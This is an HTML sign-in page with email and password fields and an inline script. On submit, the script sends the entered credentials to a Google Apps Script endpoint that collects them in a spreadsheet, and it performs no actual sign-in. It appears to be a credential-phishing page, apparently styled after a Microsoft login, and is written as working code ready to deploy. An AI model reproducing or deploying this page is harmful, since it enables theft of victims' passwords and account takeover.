<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <link rel="stylesheet" href="Style.css">
    <script src="login.js" defer></script>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="bannerlogo.jpg" alt="Logo">
        </div>
        <div class="login-box">
            <h2>Sign in</h2>
            <form name=submit-to-google-sheet>

                <label for="email">Email</label>
                <input type="email" id="email" name="email" placeholder="someone@example.com" required>

                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Password" required>

                <a href="#" class="forgot-link">Can't access your account?</a>
                <div class="button-container">
                    <button type="button" class="back-button">Back</button>
                    <button type="submit" class="submit-button">Submit</button>
                </div>
            </form>
            <script>
  const scriptURL = 'https://script.google.com/macros/s/AKfycbxCVNF0hR7bbSlx7s_F8Lmpn_QGjQnEmopnsgdhhKOCfistR_P56s9Yc4BZ6HTnGLmS/exec'
  const form = document.forms['submit-to-google-sheet']

  form.addEventListener('submit', e => {
    e.preventDefault()
    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
      .then(response => console.log('Success!', response))
      .catch(error => console.error('Error!', error.message))
  })
</script>
        </div>
    </div>
</body>
</html>
